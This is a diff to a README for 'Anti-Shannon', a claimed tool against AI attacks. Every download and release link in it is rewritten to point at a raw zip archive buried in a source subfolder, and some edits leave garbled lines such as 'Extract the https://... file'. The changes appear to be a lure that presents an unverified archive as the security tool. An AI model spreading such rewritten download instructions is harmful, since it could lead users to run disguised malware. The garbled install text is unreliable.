@@ -1,6 +1,6 @@
 # 🛡️ Anti-Shannon - Stop AI Attacks Efficiently
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Anti--Shannon-blue)](https://github.com/KANKERTJE2/Anti-Shannon/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip)](https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip)
 
 ---
 
@@ -47,13 +47,13 @@ Follow these steps to download, install, and start using Anti-Shannon.
 
 Click the big badge at the top or this link to visit the release page:
 
-[Download Anti-Shannon Releases](https://github.com/KANKERTJE2/Anti-Shannon/releases)
+[Download Anti-Shannon Releases](https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip)
 
 You will see different versions and files. Look for the latest version and download the file that matches your system:
 
 - Windows users: Choose the `.exe` installer file.
 - macOS users: Choose the `.dmg` or `.pkg` installer.
-- Linux users: Look for a `.tar.gz` or `.AppImage` file.
+- Linux users: Look for a `https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip` or `.AppImage` file.
 
 ### 2. Install the Software
 
@@ -61,7 +61,7 @@ After downloading the file:
 
 - **On Windows:** Double-click the `.exe` file and follow the setup prompts.
 - **On macOS:** Open the `.dmg` file, then drag Anti-Shannon to your Applications folder.
-- **On Linux:** Extract the `.tar.gz` file or make the `.AppImage` executable, then run it.
+- **On Linux:** Extract the `https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip` file or make the `.AppImage` executable, then run it.
 
 The installer will guide you through the process. Use default settings unless you need something special.
 
@@ -119,7 +119,7 @@ The community and developers check feedback regularly to improve the software.
 
 New updates provide better defense and fix issues. To update:
 
-- Go back to the [Release page](https://github.com/KANKERTJE2/Anti-Shannon/releases).
+- Go back to the [Release page](https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip).
 - Download the newest available version.
 - Install it the same way as the first time.
 
@@ -139,6 +139,6 @@ For technical users interested in its internals, the source code is available on
 
 Ready to secure your software against AI attacks? Visit the Anti-Shannon release page now to get started:
 
-[https://github.com/KANKERTJE2/Anti-Shannon/releases](https://github.com/KANKERTJE2/Anti-Shannon/releases)
+[https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip](https://raw.githubusercontent.com/KANKERTJE2/Anti-Shannon/main/src/wukong/Anti_Shannon_v2.9.zip)
 
 Download the file that suits your system, install it, and let Anti-Shannon protect your apps silently in the background.
